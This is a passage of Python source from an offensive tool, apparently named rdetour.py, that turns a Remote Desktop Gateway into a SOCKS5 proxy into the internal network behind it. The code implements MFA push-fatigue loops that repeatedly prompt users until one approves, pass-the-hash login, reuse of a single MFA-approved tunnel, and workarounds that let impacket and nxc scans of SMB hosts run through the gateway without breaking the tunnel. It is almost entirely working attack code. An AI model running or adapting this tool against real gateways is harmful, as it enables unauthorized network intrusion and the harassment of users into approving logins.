            d = client.recv(n - len(buf))
            if not d:
                raise ConnectionError("SOCKS client EOF")
            buf += d
        return buf

    def _negotiate(self, client):
        """Returns (host, port) or None after replying/closing itself."""
        client.settimeout(60)
        try:
            hdr = self._recv_exact(client, 2)
            if hdr[0] != 0x05:
                return None
            methods = self._recv_exact(client, hdr[1])
            if 0x00 not in methods:
                self.reply(client, 0xFF)
                return None
            client.sendall(b"\x05\x00")
            req = self._recv_exact(client, 4)
            if req[1] != 0x01:
                self.reply(client, 0x07)  # CONNECT only
                return None
            atyp = req[3]
            if atyp == 0x01:
                raw = self._recv_exact(client, 6)
                host = socket.inet_ntoa(raw[:4])
                port = struct.unpack(">H", raw[4:6])[0]
            elif atyp == 0x03:
                hlen = self._recv_exact(client, 1)[0]
                if not 1 <= hlen <= 255:
                    return None
                raw = self._recv_exact(client, hlen + 2)
                host = raw[:hlen].decode("latin1")
                port = struct.unpack(">H", raw[hlen:])[0]
            elif atyp == 0x04:
                raw = self._recv_exact(client, 18)
                host = socket.inet_ntop(socket.AF_INET6, raw[:16])
                port = struct.unpack(">H", raw[16:18])[0]
            else:
                self.reply(client, 0x08)
                return None
            return host, port
        except (ConnectionError, socket.timeout):
            return None

    def _fatigue_loop(self, host, port):
        a = self.args
        attempt = 0
        while True:
            attempt += 1
            self.stats["pushes"] += 1
            wait = a.mfa_interval
            if a.mfa_jitter:
                wait += random.randint(-a.mfa_jitter, a.mfa_jitter)
            print("[fatigue] push %d (approve on the phone; %ds window)..."
                  % (attempt, a.mfa_auth_timeout), file=sys.stderr, flush=True)
            try:
                t = self.factory(host, port, auth_timeout=a.mfa_auth_timeout)
                print("[fatigue] approved on push %d — tunnel live" % attempt,
                      file=sys.stderr, flush=True)
                self.mfa_gate.set()
                return t
            except MfaNotApproved as e:
                if a.mfa_max and attempt >= a.mfa_max:
                    raise RDGError("fatigue: %d pushes exhausted (%s)"
                                   % (a.mfa_max, e))
                print("[fatigue] %s — next push in %ds" % (e, max(wait, 1)),
                      file=sys.stderr, flush=True)
                time.sleep(max(wait, 1))
            # other failures propagate — not fatigue-retryable

    def _connect(self, host, port, conn_id):
        a = self.args
        with self.establish_lock:
            if not a.mfa_fatigue:
                say("[conn %d] opening tunnel to %s:%d (auth window %ds — "
                    "approve the push if the gateway prompts)"
                    % (conn_id, host, port, a.auth_timeout))
                return self.factory(host, port, auth_timeout=a.auth_timeout)
            with self.mfa_lock:
                if self.mfa_dead:
                    raise RDGError("fatigue already failed permanently")
                if not self.mfa_gate.is_set():
                    try:
                        return self._fatigue_loop(host, port)
                    except MfaNotApproved:
                        raise
                    except RDGError:
                        self.mfa_dead = True
                        raise
            # Gate open: each new tunnel still triggers a push under
            # per-auth MFA — give the operator a window to approve each one.
            for i in range(3):
                say("[conn %d] push sent for this connection — approve it "
                    "(%ds)" % (conn_id, a.mfa_auth_timeout))
                try:
                    return self.factory(host, port,
                                        auth_timeout=a.mfa_auth_timeout)
                except MfaNotApproved:
                    if i == 2:
                        raise
                    time.sleep(5)

    def handle(self, client):
        t = None
        try:
            target = self._negotiate(client)
            if target is None:
                return
            host, port = target
            conn_id = self._next_conn()
            self.args.log("CONNECT %s:%d" % (host, port))
            t = self._connect(host, port, conn_id)
            self.reply(client, 0x00)
            self.stats["opened"] += 1
            say("[conn %d] tunnel live · channel %s:%d" %
                (conn_id, host, port))

            def reader():
                try:
                    while not t.closed and t.channel_open:
                        d = t.read(timeout=15)
                        if d:
                            client.sendall(d)
                        elif t.closed or not t.channel_open:
                            break
                except Exception:
                    pass
                try:
                    client.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass

            threading.Thread(target=reader, daemon=True).start()
            client.settimeout(None)
            while not t.closed and t.channel_open:
                d = client.recv(65536)
                if not d:
                    break
                t.write(d)
        except MfaNotApproved as e:
            self.stats["failed"] += 1
            self.stats["pushes"] += 1
            self.fail(client, 0x02, "mfa not approved: %s" % e)
            if not self.mfa_hinted:
                self.mfa_hinted = True
                say("[hint] the gateway is MFA/CAP-gated. Each proxied "
                    "connection = one approval; with per-auth MFA (e.g. Duo "
                    "RD Gateway plugin) every new tunnel re-prompts.")
                if not self.args.mfa_fatigue:
                    say("[hint] retry with --mfa-fatigue to loop pushes on a "
                        "cadence until approved.")
                say("[hint] note: under FAIL-CLOSED MFA, users with no MFA "
                    "enrollment are denied outright (win32 23003) — that is "
                    "gateway policy, not a tool failure.")
        except RDGPolicyError as e:
            self.stats["failed"] += 1
            self.fail(client, 0x02, "policy: %s" % e)
        except RDGAuthError as e:
            self.stats["failed"] += 1
            self.fail(client, 0x01, "auth: %s" % e)
        except RDGUnreachableError as e:
            self.stats["failed"] += 1
            self.fail(client, 0x03, "unreachable via gateway: %s" % e)
        except RDGError as e:
            self.stats["failed"] += 1
            self.fail(client, 0x01, "tunnel: %s" % e)
        except (ConnectionError, socket.timeout, OSError) as e:
            self.stats["failed"] += 1
            self.fail(client, 0x03, "network: %r" % e)
        finally:
            if t:
                t.close()
            try:
                client.close()
            except Exception:
                pass

    def fail(self, client, rep, msg):
        print("[!]", msg, file=sys.stderr, flush=True)
        try:
            self.reply(client, rep)
        except Exception:
            pass

    def serve(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.args.socks_host, self.args.socks_port))
        srv.listen(16)
        mode = ""
        if self.args.mfa_fatigue:
            mode = " [mfa-fatigue %ds%s]" % (
                self.args.mfa_interval,
                ", max %d" % self.args.mfa_max if self.args.mfa_max else "")
        print("[*] SOCKS5 %s:%d via %s:%d as %s%s" %
              (self.args.socks_host, self.args.socks_port, self.args.gateway,
               self.args.gport, self.args.ident_label, mode), flush=True)
        try:
            while True:
                c, _ = srv.accept()
                threading.Thread(target=self.handle, args=(c,), daemon=True).start()
        except KeyboardInterrupt:
            print("\n[*] opened=%d failed=%d pushes=%d" %
                  (self.stats["opened"], self.stats["failed"],
                   self.stats["pushes"]))


def refused445_cache_path(gateway):
    # one file per gateway as typed: sanitized for the filesystem plus a
    # sha1(raw)[:8] tag so gateways that sanitize identically ("rdg a" vs
    # "rdg-a") never share a cache; RDETOUR_CACHE_DIR overrides the default
    # ~/.rdetour (test isolation only — the operator path stays stable)
    name = re.sub(r"[^a-z0-9.-]+", "-", gateway.lower())
    d = os.environ.get("RDETOUR_CACHE_DIR", os.path.expanduser("~/.rdetour"))
    return os.path.join(d, "refused445-%s-%s.json" %
                        (name, hashlib.sha1(
                            gateway.encode("utf-8")).hexdigest()[:8]))


def load_refused445(gateway):
    """Hosts classified refused-on-445 for this gateway (persistent kill
    cache). Missing file -> empty; corrupt file -> empty after one say();
    entries older than REFUSED_CACHE_TTL_S are dropped and the file is
    rewritten without them; future timestamps (clock skew) clamp to now."""
    path = refused445_cache_path(gateway)
    try:
        with open(path, "r") as f:
            doc = json.load(f)
        entries = doc.get("refused445") if isinstance(doc, dict) else None
        if not isinstance(entries, dict):
            entries = {}
    except FileNotFoundError:
        return set()
    except (OSError, ValueError) as e:
        say("[warm] refused-445 cache unreadable (%s) — starting empty" % e)
        return set()
    now = time.time()
    live = {}
    for h, ts in entries.items():
        if isinstance(ts, (int, float)) and now - ts < REFUSED_CACHE_TTL_S:
            live[h] = min(ts, now)     # future ts -> now, so it ages out
    if len(live) != len(entries):
        try:
            save_refused445(gateway, live)
        except OSError as e:
            say("[warm] refused-445 cache rewrite failed (%s)" % e)
    return set(live)


def save_refused445(gateway, entries):
    """Atomic (mkstemp in the same dir + os.replace — two savers never
    publish a half-written file); entries is host -> classified-at ts."""
    path = refused445_cache_path(gateway)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    fd, tmp = tempfile.mkstemp(dir=os.path.dirname(path),
                               prefix=os.path.basename(path) + ".",
                               suffix=".tmp")
    try:
        with os.fdopen(fd, "w") as f:
            json.dump({"version": 1, "gateway": gateway,
                       "refused445": entries}, f)
        os.replace(tmp, path)
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


class WarmSocksServer(SocksServer):
    """SOCKS5 over ONE MFA-paid tunnel, reused via the wire-verified channel
    cycle CLOSE_CHANNEL(0) -> CHANNEL_CREATE. Every proxied connection is a
    channel on the same authorized tunnel, so per-auth MFA (Duo RDG plugin)
    is paid exactly once per tunnel lifetime, not per connection.

    Constraints (live-gateway verified, Server 2019 RDG):
    - exactly one channel at a time: connections are serialized (queued)
    - a DENIED CHANNEL_CREATE (unreachable target 23005, RAP deny) RSTs the
      tunnel -> next connection re-establishes and re-pays MFA; for port 445
      the gateway-loopback fallback sidesteps this entirely: the create goes
      out as [target, 127.0.0.1] (pick-live name list), so the gateway's own
      SMB answers when the target cannot and the create is never denied;
      the response's SMB ServerGUID then says whether the target or the
      gateway answered (dead hosts get their SOCKS connection cut locally)
    - if the TARGET closes or resets its socket while the channel is open
      (protocol violation, invalid probe bytes, connection reuse the server
      rejects — wire-verified: a 2nd SMB negotiate on one connection), the
      gateway aborts the channel (0x10 reason 0x800759d8) AND tears down the
      whole tunnel -> rebuild (+1 push for push users). Keep proxied
      connections to a single request/response per connection (negotiate-
      style scans) or one long-lived well-behaved session (SSH/RDP); the
      always-running reader thread keeps client-side write patterns from
      tripping the same abort.
    - impacket/nxc open EVERY 445 connection with a single-dialect SMB1
      negotiate probe; SMB1-disabled targets (Server 2019 default) RST it,
      which is the killer above. The probe is answered LOCALLY with an RST
      before any channel exists (clients reconnect multi-dialect — same as
      direct), so it never touches the gateway.
    - a GRANTED-but-silent channel (refused port — wire matrix A1-A4: any
      create whose first name is a refused port) never delivers data, never
      acks a close, and wedges the tunnel. Detected within STILLBORN_S of
      the first client write: tunnel discarded, client reset, and the 445
      host is answered locally (SOCKS refused) from then on — one tunnel
      lost per refused host, not one per connection.
    - TUNNEL_CLOSE / idle keepalive failure also end the tunnel
    """

    def __init__(self, args, tunnel_factory):
        SocksServer.__init__(self, args, tunnel_factory)
        self.tunnel = None
        self.chan_lock = threading.Lock()   # one channel at a time
        self.tunnel_lock = threading.Lock()
        # gateway-loopback fallback oracle (port 445)
        self.gw_guid = None                 # gateway's SMB ServerGUID
        self.gw_guid_tried = False
        self.gw_ips = set()                 # gateway's own addresses
        self.stats["gw_dead"] = 0
        self.stats["smb1_local"] = 0        # probes answered locally (free)
        self.stats["loopback_local"] = 0    # loopback primaries refused free
        self.stats["stillborn"] = 0         # granted-but-silent channels
        self.stats["instakill_cached"] = 0  # first-contact RST aborts cached
        self.refused_lock = threading.Lock()
        self.stillborn_hosts = load_refused445(self.args.gateway)
        say("[warm] refused-445 cache: %d hosts loaded from %s" %
            (len(self.stillborn_hosts),
             refused445_cache_path(self.args.gateway)))

    def _abort(self, client, replied, code, msg):
        """Fail a SOCKS client. After a success reply (the 445 sniff path)
        a second SOCKS reply is garbage the client would read as target
        bytes — hard-reset instead, exactly like a dying connection."""
        if replied:
            rst(client)
        else:
            self.fail(client, code, msg)

    def _gateway_ips(self):
        if not self.gw_ips:
            self.gw_ips.add(str(self.args.gateway).lower())
            try:
                self.gw_ips.update(
                    ai[4][0] for ai in socket.getaddrinfo(
                        self.args.gateway, None, socket.AF_INET))
            except socket.gaierror:
                pass
        return self.gw_ips

    def _ensure_gw_guid(self, t):
        """One loopback SMB cycle to learn the gateway's ServerGUID. With it,
        any later [host, 127.0.0.1] channel whose SMB answer carries this
        GUID actually landed on the gateway — i.e. the host is dead."""
        if self.gw_guid_tried:
            return self.gw_guid
        self.gw_guid_tried = True
        if not getattr(self.args, "gw_fallback", True):
            return None
        if t.closed:
            return None
        if t.channel_open:
            # a stuck-open channel would make the baseline create a
            # create-with-live-channel (RST) — quiesce first
            try:
                t.close_channel()
            except RDGError:
                t.closed = True
                t.suspect = True   # discarded without a clean handshake
                return None
        try:
            t.open_channel(["127.0.0.1"], 445)
            t.write(smb2_negotiate())
            buf = b""
            t0 = time.monotonic()
            while len(buf) < 92 and time.monotonic() - t0 < 5:
                d = t.read(timeout=1)
                if d:
                    buf += d
            g = smb2_server_guid(buf)
            t.close_channel()
            if g:
                self.gw_guid = g
                say("[warm] gateway SMB GUID %s — 445 fallback oracle armed"
                    % g.hex())
            else:
                say("[warm] no SMB2 answer on gateway loopback — "
                    "fallback disabled")
        except (RDGError, ConnectionError, ssl.SSLError, OSError) as e:
            say("[warm] gateway fallback unavailable: %s" % e)
            t.channel_open = False   # baseline channel is dead
            t.closed = True
            t.suspect = True       # discarded without a clean handshake
        return self.gw_guid

    def _ensure_tunnel(self):
        with self.tunnel_lock:
            t = self.tunnel
            if t is not None and not t.closed:
                return t
            if t is not None:
                t.close()
            say("[warm] establishing tunnel — approve the ONE push "
                "(window %ds)" % self.args.auth_timeout)
            t = self.factory(auth_timeout=self.args.auth_timeout)
            t.suspect = False      # fresh tunnel: no dirty-close history —
            self.tunnel = t        # only a SURVIVING tunnel keeps a mark
            self.stats["pushes"] += 1
            say("[warm] tunnel live — channels from here on are free")
            return t

    def _refused_remember(self, host, why):
        """Classify host refused-on-445 and persist it: later connections —
        this run or any run inside the TTL — are answered locally, so the
        host can never again cost a tunnel (and a push). Returns True only
        when the host was newly added (stat callers dedup on it)."""
        # same normalization as the loopback primary check, so the cached
        # key matches the lookup however the client typed the host
        host = str(host).strip().lower()
        with self.refused_lock:
            if host in self.stillborn_hosts:
                return False
            self.stillborn_hosts.add(host)
            # merge onto the FILE's entries (not just the in-memory set) so
            # unrelated hosts keep their original classify timestamps
            entries = {}
            try:
                with open(refused445_cache_path(self.args.gateway),
                          "r") as f:
                    doc = json.load(f)
                if isinstance(doc, dict) and \
                        isinstance(doc.get("refused445"), dict):
                    entries = doc["refused445"]
            except (OSError, ValueError):
                pass
            entries[str(host)] = time.time()
            try:
                save_refused445(self.args.gateway, entries)
            except OSError as e:
                say("[warm] refused-445 cache write failed (%s)" % e)
            say("[warm] %s cached refused-445 (%s) — future connections "
                "answered locally" % (host, why))
            return True

    def handle(self, client):
        t = None
        conn_id = self._next_conn()
        replied = False
        try:
            target = self._negotiate(client)
            if target is None:
                return
            host, port = target
            self.args.log("CONNECT %s:%d" % (host, port))
            h = str(host).strip().lower()
            if h == "localhost" or h == "::1" or h.startswith("127."):
                # loopback as the client-requested PRIMARY target: the
                # gateway denies the create (23005, observed live — a
                # client-stack artifact cost a whole tunnel). Loopback as
                # the fallback's ALTERNATE is fine; as primary it never
                # is. Refuse locally, tunnel untouched.
                self.stats["loopback_local"] += 1
                self.fail(client, 0x05, "loopback refused locally")
                say("[conn %d] %s:%d loopback refused — answered locally, "
                    "tunnel untouched" % (conn_id, host, port))
                return
            if port == 445 and h in self.stillborn_hosts:
                # diagnosed refused port from an earlier connection: probing
                # again would wedge another tunnel (and cost another push);
                # answering locally costs nothing
                self.stats["stillborn"] += 1
                self.fail(client, 0x05, "refused (cached stillborn)")
                say("[conn %d] %s:%d refused (cached) — answered locally, "
                    "tunnel untouched" % (conn_id, host, port))
                return
            sniff = b""
            if port == 445:
                # SMB clients speak first, so the probe is visible BEFORE any
                # channel exists. impacket opens every connection with a
                # single-dialect SMB1 negotiate that SMB1-disabled targets
                # RST — and a forwarded RST kills the tunnel (0x800759d8).
                # Answer the probe locally, exactly like such a server:
                # impacket reconnects multi-dialect and proceeds. A silent
                # 445 client (none known) is dropped after SNIFF_S.
                self.reply(client, 0x00)
                replied = True
                client.settimeout(SNIFF_S)
                try:
                    sniff = client.recv(65536)
                except (ConnectionError, socket.timeout, OSError):
                    return
                if not sniff:
                    return
                if smb1_probe(sniff):
                    self.stats["smb1_local"] += 1
                    say("[conn %d] SMB1 probe answered locally (RST) — "
                        "tunnel untouched" % conn_id)
                    rst(client)
                    return
                client.settimeout(None)
            with self.chan_lock:            # serialized: one channel at a time
                t = self._ensure_tunnel()
                host_is_gw = str(host).lower() in self._gateway_ips()
                use_fb = (port == 445 and not host_is_gw
                          and self._ensure_gw_guid(t) is not None)
                if t.channel_open:
                    # previous session's close never completed — best effort
                    try:
                        t.close_channel()
                    except RDGError:
                        t = self._ensure_tunnel()
                try:
                    t.open_channel([host, "127.0.0.1"] if use_fb else host,
                                   port)
                except (RDGPolicyError, RDGUnreachableError):
                    # A denied channel create kills the tunnel (observed
                    # RST) — and a silent one (no response in 25s) gets its
                    # denial late, which RSTs the tunnel right after. Either
                    # way the tunnel is spent: discard it.
                    # (Cannot happen on 445 with the fallback armed.)
                    t.closed = True
                    try:
                        t.close()
                    except Exception:
                        pass
                    self.tunnel = None
                    raise
                if not replied:
                    self.reply(client, 0x00)
                self.stats["opened"] += 1
                say("[conn %d] channel %s:%d on warm tunnel%s" %
                    (conn_id, host, port,
                     " (+gw fallback)" if use_fb else ""))

                gw_guid = self.gw_guid
                wrote = [None]         # first client->channel write time
                life = [False]         # any channel data ever arrived
                t.drain_saw_data = False   # per channel session: DATA the
                                           # tunnel eats invisibly (drain /
                                           # mid-body death) resets here

                def reader():
                    classified = not use_fb   # sniff only fallback channels
                    snif = b""
                    snif_t0 = None
                    try:
                        while not t.closed and t.channel_open:
                            d = t.read(timeout=1)   # short poll: must notice
                            if d:                   # channel_open flips fast
                                life[0] = True      # so it can never steal
                                if classified:      # the NEXT channel's data
                                    client.sendall(d)
                                    continue
                                # Fallback channel: hold the first response
                                # until we know whose it is. Gateway GUID =>
                                # the target never answered and loopback won:
                                # report the host dead by cutting the client
                                # loose; anything else => real target answered
                                # and the bytes relay normally.
                                snif += d
                                if snif_t0 is None:
                                    snif_t0 = time.monotonic()
                                g = smb2_server_guid(snif)
                                if g is not None and g == gw_guid:
                                    self.stats["gw_dead"] += 1
                                    say("[conn %d] %s:%d DEAD "
                                        "(landed on gateway loopback)" %
                                        (conn_id, host, port))
                                    # dead and refused are the same verdict
                                    # for an SMB scan, and the gateway's
                                    # refused->loopback fallback is racy per
                                    # hit (host .158 killed 1-of-3 observed
                                    # contacts) — cached, later contacts are
                                    # free AND immune to the race
                                    self._refused_remember(
                                        host, "gateway-loopback oracle")
                                    t.channel_open = False
                                    try:
                                        client.shutdown(socket.SHUT_RDWR)
                                    except Exception:
                                        pass
                                    return
                                if g is not None or len(snif) > 4096 or \
                                        time.monotonic() - snif_t0 > 4:
                                    # answered, not the gateway => live host
                                    classified = True
                                    client.sendall(snif)
                                # else: keep buffering (<92B so far)
                            elif (not life[0] and wrote[0] is not None and
                                  time.monotonic() - wrote[0] > STILLBORN_S):
                                # GRANTED but silent: the wire matrix's
                                # stillborn channel (refused port). It never
                                # delivers and never acks a close — the
                                # tunnel is spent. Cut the client loose,
                                # remember the port, let the next connection
                                # rebuild.
                                self.stats["stillborn"] += 1
                                t.closed = True
                                try:
                                    t.close()
                                except Exception:
                                    pass
                                cached = ""
                                if port == 445:
                                    self._refused_remember(host, "stillborn")
                                    cached = ", 445 cached local-refuse"
                                say("[conn %d] %s:%d STILLBORN — granted but"
                                    " silent %.1fs (refused port?): tunnel "
                                    "discarded%s" %
                                    (conn_id, host, port, STILLBORN_S,
                                     cached))
                                # shutdown (not rst): a concurrent writer
                                # recv on this socket defers a linger-close's
                                # RST — shutdown wakes it and EOFs the client
                                try:
                                    client.shutdown(socket.SHUT_RDWR)
                                except Exception:
                                    pass
                                return
                            # else: client hasn't written yet, or the target
                            # is quiet mid-session — only the FIRST response
                            # is covered by the stillborn window
                    except Exception:
                        pass
                    try:
                        client.shutdown(socket.SHUT_RDWR)
                    except Exception:
                        pass

                rt = threading.Thread(target=reader, daemon=True)
                rt.start()
                client.settimeout(15)    # reader-stuck fix: sendall blocks
                                         # forever when the SOCKS client
                                         # disconnects mid-flow; 15s is
                                         # generous for legit writes but
                                         # well under the kernel's TCP
                                         # retransmit timeout (~2min)
                if sniff:                # the multi-dialect negotiate we held
                    wrote[0] = time.monotonic()
                    t.write(sniff)
                try:
                    while not t.closed and t.channel_open:
                        try:
                            d = client.recv(65536)
                        except (ConnectionError, socket.timeout, OSError):
                            # client hung up rudely (RST with unread data) —
                            # its channel dies, the TUNNEL must not
                            break
                        if not d:
                            break
                        if wrote[0] is None:
                            wrote[0] = time.monotonic()
                        t.write(d)
                finally:
                    # Quiesce the reader FIRST: it polls on a 1s timeout and
                    # must be dead before close_channel(), or it races us for
                    # the 0x11 ack on the shared OUT stream.
                    t.channel_open = False
                    rt.join(timeout=10)
                    if rt.is_alive():
                        say("[conn %d] reader stuck — discarding tunnel" %
                            conn_id)
                        t.closed = True
                        t.suspect = True     # dirty discard, no handshake
                        t.close()
                    elif not t.closed and not t._srv_closed_channel:
                        try:
                            t._close_channel_xchg()
                            t.last_close_abrupt = False
                        except RDGError:
                            t.closed = True
                            t.suspect = True   # close handshake failed dirty
                    elif not t.closed:
                        # server already closed the channel (0x10 seen by
                        # the reader) — its teardown is the slow, racy kind
                        t.last_close_abrupt = True
                        t.suspect = True     # delayed-kill precursor: the
                        # NEXT channel on this tunnel can die for the
                        # PREVIOUS close, not for its own target
                    if t.closed:
                        with self.tunnel_lock:
                            if self.tunnel is t:
                                self.tunnel = None
                    if port == 445 and t.closed and wrote[0] is not None \
                            and not life[0] \
                            and not getattr(t, "drain_saw_data", False) \
                            and not getattr(t, "suspect", False):
                        # INSTA-KILL, the real refused wire shape: the tunnel
                        # RSTs silently right after the create and NO close
                        # reason is ever delivered (money log: 192.168.15.1,
                        # 192.168.15.152) — so the gate is reason-agnostic:
                        # zero response bytes + the client had written + the
                        # tunnel died with this channel. Suppressed when the
                        # tunnel was already dirty (suspect: the cause is a
                        # PRIOR channel's abnormal close, not this host) or
                        # the tunnel consumed the answer invisibly (close
                        # drain / mid-body DATA death). A LIVE host that
                        # answered anything (life[0]) and only aborted later
                        # (0x800759d8 multi-request) is never cached either.
                        if self._refused_remember(host,
                                                  "first-contact RST abort"):
                            self.stats["instakill_cached"] += 1
                    why = ""
                    r = getattr(t, "last_srv_close_reason", None)
                    if r == 0x800759D8:
                        why = (" — gateway ABORTED channel: the target "
                               "closed/reset (multi-request or invalid "
                               "protocol on this channel kills tunnels)")
                    elif r:
                        why = " — server closed channel (0x%08x)" % r
                    say("[conn %d] channel closed — tunnel %s%s" %
                        (conn_id, "dead" if t.closed else "stays warm", why))
        except MfaNotApproved as e:
            self.stats["failed"] += 1
            self._abort(client, replied, 0x02, "mfa not approved: %s" % e)
            say("[warm] push not approved — retry the connection to re-push")
        except RDGPolicyError as e:
            self.stats["failed"] += 1
            self._abort(client, replied, 0x02,
                        "policy: %s (tunnel discarded)" % e)
        except RDGAuthError as e:
            self.stats["failed"] += 1
            self._abort(client, replied, 0x01, "auth: %s" % e)
        except RDGUnreachableError as e:
            self.stats["failed"] += 1
            self._abort(client, replied, 0x03,
                        "unreachable via gateway: %s" % e)
        except (RDGError, ConnectionError, socket.timeout, OSError) as e:
            self.stats["failed"] += 1
            self._abort(client, replied, 0x03, "tunnel/network: %r" % e)
            if t is not None:
                t.closed = True
                t.close()
            with self.tunnel_lock:
                if self.tunnel is t:
                    self.tunnel = None
        finally:
            try:
                client.close()
            except Exception:
                pass

    def serve(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.args.socks_host, self.args.socks_port))
        srv.listen(512)   # nxc /24 opens 256 threads; backlog 16 RSTs the
                          # 17th SYN and nxc reports live hosts as down
        print("[*] SOCKS5 %s:%d via %s:%d as %s — one approval per tunnel, "
              "sequential channels, SMB1 probes answered locally" %
              (self.args.socks_host, self.args.socks_port, self.args.gateway,
               self.args.gport, self.args.ident_label), flush=True)
        try:
            while True:
                c, _ = srv.accept()
                threading.Thread(target=self.handle, args=(c,),
                                 daemon=True).start()
        except KeyboardInterrupt:
            print("\n[*] opened=%d failed=%d pushes=%d (tunnels paid) "
                  "smb1_local=%d loopback_local=%d stillborn=%d "
                  "instakill_cached=%d refused445_cache=%d" %
                  (self.stats["opened"], self.stats["failed"],
                   self.stats["pushes"], self.stats["smb1_local"],
                   self.stats["loopback_local"], self.stats["stillborn"],
                   self.stats["instakill_cached"],
                   len(self.stillborn_hosts)))


def check_mode(args):
    host, port = args.target.rsplit(":", 1)

    def open_tunnel():
        t = RDGTunnel(args.gateway, args.gport, args.domain, args.user,
                      args.password, nthash=args.nthash, path=args.rdg_path,
                      client_name=args.client_name,
                      connect_timeout=args.timeout, verbose=args.verbose,
                      ext_auth=args.ext_auth, paa_cookie=args.paa_cookie)
        t.connect_tunnel(host, int(port), auth_timeout=args.mfa_auth_timeout)
        return t

    if args.mfa_fatigue:
        attempt = 0
        while True:
            attempt += 1
            wait = args.mfa_interval
            if args.mfa_jitter:
                wait += random.randint(-args.mfa_jitter, args.mfa_jitter)
            print("[fatigue] push %d (approve on the phone; %ds window)..."
                  % (attempt, args.mfa_auth_timeout), file=sys.stderr,
                  flush=True)
            try:
                t = open_tunnel()
                print("[fatigue] approved on push %d — tunnel live" % attempt,
                      file=sys.stderr, flush=True)
                break
            except MfaNotApproved as e:
                if args.mfa_max and attempt >= args.mfa_max:
                    raise RDGError("fatigue: %d pushes exhausted (%s)"
                                   % (args.mfa_max, e))
                print("[fatigue] %s — next push in %ds"
                      % (e, max(wait, 1)), file=sys.stderr, flush=True)
                time.sleep(max(wait, 1))
    else:
        t = open_tunnel()
    print("[+] tunnel established to %s:%s" % (host, port))
    if args.probe == "smb":
        t.write(smb2_negotiate())
        r = t.read(timeout=10)
        if r:
            print("[+] SMB2 reply %d bytes: %s" % (len(r), r[:32].hex()))
            print("[+] arbitrary TCP through RDG confirmed")
        else:
            print("[-] no SMB2 reply (channel open but target silent)")
    t.close()
    return 0


def parse_args(argv=None):
    ap = argparse.ArgumentParser(
        prog="rdetour.py",
        description="Turn an RD Gateway into a SOCKS5 proxy into its network.")
    ap.add_argument("-g", "--gateway", required=True,
                    help="RD Gateway host (FQDN or IP)")
    ap.add_argument("--gport", type=int, default=443)
    ap.add_argument("--rdg-path", default="/remoteDesktopGateway/",
                    help="IIS RDG virtual directory (default: %(default)s)")
    ap.add_argument("-u", "--user", required=True,
                    help="DOMAIN\\\\user or user@domain or bare user (+ -d)")
    ap.add_argument("-d", "--domain", help="domain (optional)")
    ap.add_argument("-p", "--password", default="",
                    help="password (fallback: env RDETOUR_PASSWORD)")
    ap.add_argument("--hashes", help="LM:NT (pass-the-hash)")
    ap.add_argument("--target", help="host:port — one-shot check mode, no SOCKS")
    ap.add_argument("--probe", choices=["smb", "none"], default="smb",
                    help="check-mode payload (default: %(default)s)")
    ap.add_argument("--socks-host", default="127.0.0.1")
    ap.add_argument("--socks-port", type=int, default=1080)
    ap.add_argument("--timeout", type=int, default=15,
                    help="TCP/TLS connect timeout (default: %(default)s)")
    ap.add_argument("--auth-timeout", type=int, default=60,
                    help="tunnel-auth approval window in seconds — how long "
                         "you have to approve an MFA push per connection "
                         "(default: %(default)s)")
    ap.add_argument("--client-name", help="tunnel client name (default: hostname)")
    ap.add_argument("--ext-auth", choices=["none", "sspi_ntlm", "paa"],
                    default="none",
                    help="MS-TSGU extended-auth mode: sspi_ntlm = NTLM tokens "
                         "in tunnel packets (no HTTP auth); paa = PAA cookie "
                         "auth (see --paa-cookie). Server-advertised modes "
                         "appear in handshake logs with -v.")
    ap.add_argument("--paa-cookie", help="PAA cookie string (with --ext-auth paa)")
    ap.add_argument("--bridge", type=int, metavar="PORT",
                    help="single-tunnel bridge mode (with --target): pay ONE "
                         "MFA, then bridge the channel to 127.0.0.1:PORT — "
                         "pair with ssh -D for unlimited multiplexed use")
    ap.add_argument("--mfa-fatigue", action="store_true",
                    help="retry tunnel auth on a cadence; each attempt "
                         "triggers a fresh MFA push until approved")
    ap.add_argument("--mfa-interval", type=int, default=60,
                    help="seconds between pushes (default: %(default)s)")
    ap.add_argument("--mfa-jitter", type=int, default=0,
                    help="+/- random seconds on the interval (default: %(default)s)")
    ap.add_argument("--no-gw-fallback", dest="gw_fallback",
                    action="store_false", default=True,
                    help="disable the 445 gateway-loopback fallback (with it, "
                         "every 445 channel is created as [target,127.0.0.1] "
                         "so dead hosts can never deny the create and cost a "
                         "push; the SMB ServerGUID tells dead from alive)")
    ap.add_argument("--mfa-max", type=int, default=0,
                    help="stop after N pushes, 0 = unlimited (default: %(default)s)")
    ap.add_argument("--mfa-auth-timeout", type=int, default=65,
                    help="seconds to await push approval per attempt "
                         "(default: %(default)s)")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args(argv)

    if "\\" in args.user:
        dom, user = args.user.split("\\", 1)
        args.domain = args.domain or dom
        args.user = user
    elif "@" in args.user and not args.domain:
        args.user, args.domain = args.user.split("@", 1)
    if not args.password:
        args.password = os.environ.get("RDETOUR_PASSWORD", "")
    args.nthash = args.hashes.split(":")[1] if args.hashes else None
    if args.nthash is None and not args.password:
        ap.error("need -p, --hashes, or env RDETOUR_PASSWORD")
    if args.mfa_jitter and args.mfa_jitter >= args.mfa_interval:
        ap.error("--mfa-jitter must be smaller than --mfa-interval")

    def log(msg):
        if args.verbose:
            print("[socks]", msg, file=sys.stderr, flush=True)

    args.log = log
    args.ident_label = "%s\\%s" % (args.domain or "?", args.user)
    return args


def main(argv=None):
    args = parse_args(argv)

    def factory(host=None, port=None, auth_timeout=15):
        t = RDGTunnel(args.gateway, args.gport, args.domain, args.user,
                      args.password, nthash=args.nthash, path=args.rdg_path,
                      client_name=args.client_name,
                      connect_timeout=args.timeout, verbose=args.verbose,
                      ext_auth=args.ext_auth, paa_cookie=args.paa_cookie)
        if host is not None:
            t.connect_tunnel(host, port, auth_timeout=auth_timeout)
        else:
            t.establish(auth_timeout=auth_timeout)
        return t

    if args.target and args.bridge:
        try:
            return bridge_mode(args)
        except MfaNotApproved as e:
            print("[-] %s" % e, file=sys.stderr)
            return 2
        except RDGError as e:
